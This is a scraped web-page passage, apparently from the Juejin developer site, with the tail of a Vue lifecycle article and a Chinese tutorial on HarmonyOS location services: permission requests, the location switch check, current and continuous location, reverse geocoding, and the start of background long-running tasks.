<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子组件 onBeforeUnmount'</span>)
})
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子父组件 onUnmounted'</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
​
</code></pre>
<h4 data-id="heading-41">销毁子组件</h4>
<h5 data-id="heading-42">执行顺序：</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 销毁过程</span>
​
 子组件 beforeDestroy
​
 子组件 destroyed
​
</code></pre>
<h5 data-id="heading-43">代码示例：见销毁父组件的代码</h5></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS 位置服务全攻略：精准定位、地理编码与后台持续定位实现]]></title>    <link>https://juejin.cn/post/7576942980708712448</link>    <guid>https://juejin.cn/post/7576942980708712448</guid>    <pubDate>2025-11-27T05:21:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576942980708712448" data-draft-id="7576928310788702260" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS 位置服务全攻略：精准定位、地理编码与后台持续定位实现"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-27T05:21:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT充电站"/> <meta itemprop="url" content="https://juejin.cn/user/125809758576431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS 位置服务全攻略：精准定位、地理编码与后台持续定位实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/125809758576431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT充电站
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:21:39.000Z" title="Thu Nov 27 2025 05:21:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>✨家人们记得点个账号关注，会持续发布大前端领域技术文章💕 🍃</p>
<p>在 HarmonyOS 应用开发中，位置服务是许多场景的核心能力 —— 无论是本地生活服务的附近推荐、导航应用的实时轨迹追踪，还是出行类 App 的后台定位，都离不开稳定、精准的位置获取能力。本文将从权限配置、位置获取、地理编码转换、持续定位到后台长时定位，一步步拆解 HarmonyOS 位置服务的完整实现流程，附带可直接复用的代码示例，助力开发者快速落地功能。</p>
<h2 data-id="heading-0">获取设备的位置信息</h2>
<blockquote>
<p>1-配置申请位置权限 同时申请ohos.permission.APPROXIMATELY_LOCATION和ohos.permission.LOCATION 获取到精准位置，精准度在米级别。</p>
<p>2-检查全局位置开关是否打开 geoLocationManager.isLocationEnabled();</p>
<ul>
<li>2.1 没开 atManager.requestGlobalSwitch(getContext(this), abilityAccessCtrl.SwitchType.LOCATION) 拉起全局设置位置开关页</li>
<li>2.2 开了 继续</li>
</ul>
<p>3-获取当前位置 geoLocationManager.getCurrentLocation(request) 可以获取用户经度纬度</p>
<p>4-可以继续通过geoLocationManager.getAddressesFromLocation()地理编码转化为可读性较强地址</p>
</blockquote>
<ul>
<li>获取设备的位置信息，需要有位置权限，位置权限申请</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 位置信息（权限组）</span>
{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"ohos.permission.APPROXIMATELY_LOCATION"</span>,
  <span class="hljs-string">"reason"</span>: <span class="hljs-string">'<span class="hljs-subst">$string</span>:permission_reason_location'</span>,
  <span class="hljs-string">"usedScene"</span>: {}
},
{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"ohos.permission.LOCATION"</span>,
  <span class="hljs-string">"reason"</span>: <span class="hljs-string">'<span class="hljs-subst">$string</span>:permission_reason_location'</span>,
  <span class="hljs-string">"usedScene"</span>: {}
},
</code></pre>
<p>按照步骤申请权限 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V13%2Flocation-guidelines-V13" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V13/location-guidelines-V13" target="_blank" ref="nofollow noopener noreferrer">developer.huawei.com/consumer/cn…</a></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">import</span> { abilityAccessCtrl, <span class="hljs-title class_">Context</span>, common } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BusinessError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.BasicServicesKit'</span>;
<span class="hljs-keyword">import</span> { permissionUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/PermissionUtil'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-string">'获取位置信息'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-comment">// 1 配置文件 申请权限   同时申请ohos.permission.APPROXIMATELY_LOCATION和ohos.permission.LOCATION 获取到精准位置，精准度在米级别。</span>
      <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> permissionUtil.<span class="hljs-title function_">checkPermissions</span>([<span class="hljs-string">'ohos.permission.APPROXIMATELY_LOCATION'</span>, <span class="hljs-string">'ohos.permission.LOCATION'</span>], <span class="hljs-title function_">getContext</span>());
      <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>

      <span class="hljs-comment">// 2 检查全局开关  开了-继续走，没开-弹出让他授权</span>
      <span class="hljs-keyword">const</span> locationEnabled = geoLocationManager.<span class="hljs-title function_">isLocationEnabled</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'查看当前全局开关状态：'</span>, locationEnabled)

      <span class="hljs-keyword">if</span> (!locationEnabled) {  <span class="hljs-comment">// 没开</span>
        <span class="hljs-keyword">const</span> <span class="hljs-attr">atManager</span>: abilityAccessCtrl.<span class="hljs-property">AtManager</span> = abilityAccessCtrl.<span class="hljs-title function_">createAtManager</span>();
        <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> atManager.<span class="hljs-title function_">requestGlobalSwitch</span>(<span class="hljs-title function_">getContext</span>(), abilityAccessCtrl.<span class="hljs-property">SwitchType</span>.<span class="hljs-property">LOCATION</span>)
        <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// 拉起全局弹出 用户没授权就终止代码执行</span>
      }

      <span class="hljs-comment">// 3. 获取位置信息  经度纬度</span>
      geoLocationManager.<span class="hljs-title function_">getCurrentLocation</span>( {
        <span class="hljs-attr">locatingPriority</span>: geoLocationManager.<span class="hljs-property">LocatingPriority</span>.<span class="hljs-property">PRIORITY_LOCATING_SPEED</span>,
        <span class="hljs-attr">locatingTimeoutMs</span>: <span class="hljs-number">10000</span>
      }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> { <span class="hljs-comment">// 调用getCurrentLocation获取当前设备位置，通过promise接收上报的位置</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'current location: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result));
      })
        .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error:BusinessError</span>) =&gt;</span> { <span class="hljs-comment">// 接收上报的错误码</span>
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'promise, getCurrentLocation: error='</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(error));
        });
      <span class="hljs-comment">// .....</span>
    })
  }
}
</code></pre>
<h2 data-id="heading-1">地理编码转化与逆地理编码转化</h2>
<p>使用坐标描述一个位置，非常准确，但是并不直观，面向用户表达并不友好。系统向开发者提供了以下两种转化能力。</p>
<ul>
<li>地理编码转化：将地理描述转化为具体坐标。</li>
<li>逆地理编码转化能力：将坐标转化为地理描述。</li>
</ul>
<p>其中地理编码包含多个属性来描述位置，包括国家、行政区划、街道、门牌号、地址描述等等，这样的信息更便于用户理解。</p>
<p>开发步骤</p>
<ol>
<li>导入geoLocationManager模块，所有与地理编码转化&amp;逆地理编码转化能力相关的功能API，都是通过该模块提供的。</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
</code></pre>
<p>2.获取转化结果。</p>
<p>调用getAddressesFromLocation，把坐标转化为地理位置信息。应用可以获得与此坐标匹配的<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V13%2Fjs-apis-geolocationmanager-V13%23geoaddress" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V13/js-apis-geolocationmanager-V13#geoaddress" target="_blank" ref="nofollow noopener noreferrer">GeoAddress</a>（地理编码地址信息）列表，应用可以根据实际使用需求，读取相应的参数数据。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> <span class="hljs-attr">reverseGeocodeRequest</span>:geoLocationManager.<span class="hljs-property">ReverseGeoCodeRequest</span> = {
  <span class="hljs-attr">locale</span>: <span class="hljs-string">'zh'</span>,
  <span class="hljs-string">"latitude"</span>: <span class="hljs-number">31.12</span>, <span class="hljs-string">"longitude"</span>: <span class="hljs-number">121.11</span>, <span class="hljs-string">"maxItems"</span>: <span class="hljs-number">1</span>
};
<span class="hljs-keyword">try</span> {
    geoLocationManager.<span class="hljs-title function_">getAddressesFromLocation</span>(reverseGeocodeRequest, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (err) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getAddressesFromLocation err: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getAddressesFromLocation data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
        }
    });
} <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"errCode:"</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
}
</code></pre>
<p>3.示例代码</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">import</span> { abilityAccessCtrl, <span class="hljs-title class_">Context</span>, common } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">BusinessError</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.BasicServicesKit'</span>;
<span class="hljs-keyword">import</span> { permissionUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/PermissionUtil'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-string">'获取位置信息'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-comment">// 1 配置文件 申请权限   同时申请ohos.permission.APPROXIMATELY_LOCATION和ohos.permission.LOCATION 获取到精准位置，精准度在米级别。</span>
      <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> permissionUtil.<span class="hljs-title function_">checkPermissions</span>([<span class="hljs-string">'ohos.permission.APPROXIMATELY_LOCATION'</span>, <span class="hljs-string">'ohos.permission.LOCATION'</span>], <span class="hljs-title function_">getContext</span>());
      <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>

      <span class="hljs-comment">// 2 检查全局开关  开了-继续走，没开-弹出让他授权</span>
      <span class="hljs-keyword">const</span> locationEnabled = geoLocationManager.<span class="hljs-title function_">isLocationEnabled</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'查看当前全局开关状态：'</span>, locationEnabled)

      <span class="hljs-keyword">if</span> (!locationEnabled) {  <span class="hljs-comment">// 没开</span>
        <span class="hljs-keyword">const</span> <span class="hljs-attr">atManager</span>: abilityAccessCtrl.<span class="hljs-property">AtManager</span> = abilityAccessCtrl.<span class="hljs-title function_">createAtManager</span>();
        <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> atManager.<span class="hljs-title function_">requestGlobalSwitch</span>(<span class="hljs-title function_">getContext</span>(), abilityAccessCtrl.<span class="hljs-property">SwitchType</span>.<span class="hljs-property">LOCATION</span>)
        <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// 拉起全局弹出 用户没授权就终止代码执行</span>
      }

      <span class="hljs-comment">// 3. 获取位置信息  经度纬度</span>
      geoLocationManager.<span class="hljs-title function_">getCurrentLocation</span>( {
        <span class="hljs-attr">locatingPriority</span>: geoLocationManager.<span class="hljs-property">LocatingPriority</span>.<span class="hljs-property">PRIORITY_LOCATING_SPEED</span>,
        <span class="hljs-attr">locatingTimeoutMs</span>: <span class="hljs-number">10000</span>
      }).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> { <span class="hljs-comment">// 调用getCurrentLocation获取当前设备位置，通过promise接收上报的位置</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'current location: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result))

        <span class="hljs-comment">// 正地理编码与逆地理编码</span>
        geoLocationManager.<span class="hljs-title function_">getAddressesFromLocation</span>({<span class="hljs-string">"latitude"</span>: result.<span class="hljs-property">latitude</span>, <span class="hljs-string">"longitude"</span>: result.<span class="hljs-property">longitude</span>, <span class="hljs-string">"maxItems"</span>: <span class="hljs-number">1</span>}, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
          <span class="hljs-keyword">if</span> (err) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getAddressesFromLocation err: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'getAddressesFromLocation data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
          }
        });
        <span class="hljs-comment">// 正地理编码与逆地理编码 end</span>
      })
        .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error:BusinessError</span>) =&gt;</span> { <span class="hljs-comment">// 接收上报的错误码</span>
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'promise, getCurrentLocation: error='</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(error));
        });
      <span class="hljs-comment">// .....</span>
    })
  }
}
</code></pre>
<h2 data-id="heading-2">持续定位</h2>
<p>持续定位。多用于导航、运动轨迹、出行等场景。</p>
<p>首先要实例化<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V13%2Fjs-apis-geolocationmanager-V13%23continuouslocationrequest12" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V13/js-apis-geolocationmanager-V13#continuouslocationrequest12" target="_blank" ref="nofollow noopener noreferrer">ContinuousLocationRequest</a>对象，用于告知系统该向应用提供何种类型的位置服务，以及位置结果上报的频率。</p>
<ul>
<li>设置locationScenario：</li>
</ul>
<p>建议locationScenario参数优先根据应用的使用场景进行设置，该参数枚举值定义参见<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V13%2Fjs-apis-geolocationmanager-V13%23useractivityscenario12" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V13/js-apis-geolocationmanager-V13#useractivityscenario12" target="_blank" ref="nofollow noopener noreferrer">UserActivityScenario</a>，例如地图在导航时使用NAVIGATION参数，可以持续在室内和室外场景获取位置用于导航。</p>
<ul>
<li>设置interval：</li>
</ul>
<p>表示上报位置信息的时间间隔，单位是秒，默认值为1秒。如果对位置上报时间间隔无特殊要求，可以不填写该字段。</p>
<p>以地图导航场景为例，调用方式如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">request</span>: geoLocationManager.<span class="hljs-property">ContinuousLocationRequest</span>= {
   <span class="hljs-string">'interval'</span>: <span class="hljs-number">1</span>,
   <span class="hljs-string">'locationScenario'</span>: geoLocationManager.<span class="hljs-property">UserActivityScenario</span>.<span class="hljs-property">NAVIGATION</span>
}
<span class="hljs-keyword">let</span> locationCallback = (<span class="hljs-attr">location</span>:geoLocationManager.<span class="hljs-property">Location</span>):<span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'locationCallback: data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(location));
};
<span class="hljs-keyword">try</span> {
   geoLocationManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">'locationChange'</span>, request, locationCallback);
} <span class="hljs-keyword">catch</span> (err) {
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"errCode:"</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(err));
}
</code></pre>
<p>如果不主动结束定位可能导致设备功耗高，耗电快；建议在不需要获取定位信息时及时结束定位。</p>
<pre><code class="hljs language-vbnet" lang="vbnet">geoLocationManager.<span class="hljs-keyword">off</span>(<span class="hljs-comment">'locationChange', locationCallback);</span>
</code></pre>
<p>完整实例代码</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { geoLocationManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.LocationKit'</span>;
<span class="hljs-keyword">import</span> { abilityAccessCtrl } <span class="hljs-keyword">from</span> <span class="hljs-string">'@kit.AbilityKit'</span>;
<span class="hljs-keyword">import</span> { permissionUtil } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/PermissionUtil'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {

  <span class="hljs-title function_">locationCallback</span>(<span class="hljs-params">location:geoLocationManager.Location</span>)  {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'locationCallback: data: '</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(location));
  }

  <span class="hljs-title function_">aboutToDisappear</span>(<span class="hljs-params"/>) {
    geoLocationManager.<span class="hljs-title function_">off</span>(<span class="hljs-string">'locationChange'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">locationCallback</span>);
  }

  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Button</span>(<span class="hljs-string">'获取位置信息'</span>).<span class="hljs-title function_">onClick</span>(<span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-comment">// 1 配置文件 申请权限   同时申请ohos.permission.APPROXIMATELY_LOCATION和ohos.permission.LOCATION 获取到精准位置，精准度在米级别。</span>
      <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> permissionUtil.<span class="hljs-title function_">checkPermissions</span>([<span class="hljs-string">'ohos.permission.APPROXIMATELY_LOCATION'</span>, <span class="hljs-string">'ohos.permission.LOCATION'</span>], <span class="hljs-title function_">getContext</span>());
      <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>

      <span class="hljs-comment">// 2 检查全局开关  开了-继续走，没开-弹出让他授权</span>
      <span class="hljs-keyword">const</span> locationEnabled = geoLocationManager.<span class="hljs-title function_">isLocationEnabled</span>();
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'查看当前全局开关状态：'</span>, locationEnabled)

      <span class="hljs-keyword">if</span> (!locationEnabled) {  <span class="hljs-comment">// 没开</span>
        <span class="hljs-keyword">const</span> <span class="hljs-attr">atManager</span>: abilityAccessCtrl.<span class="hljs-property">AtManager</span> = abilityAccessCtrl.<span class="hljs-title function_">createAtManager</span>();
        <span class="hljs-keyword">const</span> state = <span class="hljs-keyword">await</span> atManager.<span class="hljs-title function_">requestGlobalSwitch</span>(<span class="hljs-title function_">getContext</span>(), abilityAccessCtrl.<span class="hljs-property">SwitchType</span>.<span class="hljs-property">LOCATION</span>)
        <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// 拉起全局弹出 用户没授权就终止代码执行</span>
      }

      <span class="hljs-comment">// 3. 获取位置信息  经度纬度 【持续定位。多用于导航、运动轨迹、出行等场景。】</span>
      geoLocationManager.<span class="hljs-title function_">on</span>(<span class="hljs-string">'locationChange'</span>, {
        <span class="hljs-attr">interval</span>: <span class="hljs-number">1</span>,
        <span class="hljs-attr">locationScenario</span>: geoLocationManager.<span class="hljs-property">UserActivityScenario</span>.<span class="hljs-property">NAVIGATION</span>
      }, <span class="hljs-variable language_">this</span>.<span class="hljs-property">locationCallback</span>);

      <span class="hljs-comment">// .....</span>
    })
  }
}
</code></pre>
<h2 data-id="heading-3">后台定位-长时任务</h2>
<p><strong>应用退至后台后</strong>，在后台需要长时间运行用户可感知的任务，如播放音乐、导航等。为防止<strong>应用进程被挂起</strong>，导致对应功能异常，可以<strong>申请长时任务</strong>，使应用在后台长时间运行。在长时任务中可以申请多种类型的任务，并对任务类型进行更新。应用退后台执行业务时，系统会做一致性校验，确保应用在执行相应的长时任务。同时，系统有与长时任务相关联的通知栏消息，用户删除通知栏消息时，系统会自动停止长时任务。</p>
<p>1.需要申请ohos.permission.KEEP_BACKGROUND_RUNNING权限，配置方式请参见<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V13%2Fdeclare-permissions-V13" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V13/declare-permissions-V13" target="_blank" ref="nofollow noopener noreferrer">声明权限</a>。</p>
<p>2.声明后台模式类型。</p>
